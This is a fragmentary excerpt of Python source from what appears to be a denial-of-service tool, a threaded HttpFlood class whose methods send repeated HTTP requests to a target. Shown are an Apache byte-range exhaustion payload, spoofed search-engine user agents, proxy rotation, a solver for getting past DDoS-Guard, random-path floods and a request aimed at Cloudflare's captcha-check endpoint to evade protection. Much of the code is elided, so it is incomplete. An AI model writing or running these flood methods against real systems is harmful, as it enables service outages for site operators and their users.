...
class HttpFlood(Thread):
    ...
    def TOR(self) -> None:
        provider = "." + random.choice(tor2webs)
    ...
    def APACHE(self) -> None:
        payload: bytes = self.generate_payload(
            "Range: bytes=0-," + ",".join(f"5-{i}" for i in range(1, 1024)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
    ...
    def BOT(self) -> None:
        ...
        p1 = str.encode(
            ...
            f"User-Agent: {random.choice(search_engine_agents)}\r\n"
            "Accept-Encoding: gzip,deflate,br\r\n\r\n")
        p2 = str.encode(
    ...
    def AVB(self):
        ...
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                time.sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)
        Tools.safe_close(s)
    ...
    def DGB(self):
        ...
        with suppress(Exception):
            if self._proxies:
                pro = random.choice(self._proxies)
                with Tools.dgb_solver(self._target.human_repr(), random.choice(self._useragents), pro.asRequest()) as ss:
                    for _ in range(min(self._rpc, 5)):
                        time.sleep(min(self._rpc, 5) / 100)
            ...
            with Tools.dgb_solver(self._target.human_repr(), random.choice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 5)):
                    time.sleep(min(self._rpc, 5) / 100)
    ...
    def RHEX(self):
        randhex = str(random.randbytes(random.choice([32, 64, 128])))
        payload = str.encode(f"{self._req_type} {self._target.authority}/{randhex} HTTP/1.1\r\n"
    ...
    def STOMP(self):
        ...
        p1 = str.encode(f"{self._req_type} {self._target.authority}/{hexh} HTTP/1.1\r\n"
                        f"Host: {self._target.authority}/{hexh}\r\n" +
                        self.randHeadercontent + dep)
        p2 = str.encode(f"{self._req_type} {self._target.authority}/cdn-cgi/l/chk_captcha HTTP/1.1\r\n"
                        f"Host: {hexh}\r\n" +
                        self.randHeadercontent + dep)
        s = None
        with suppress(Exception), self.open_connection() as s:
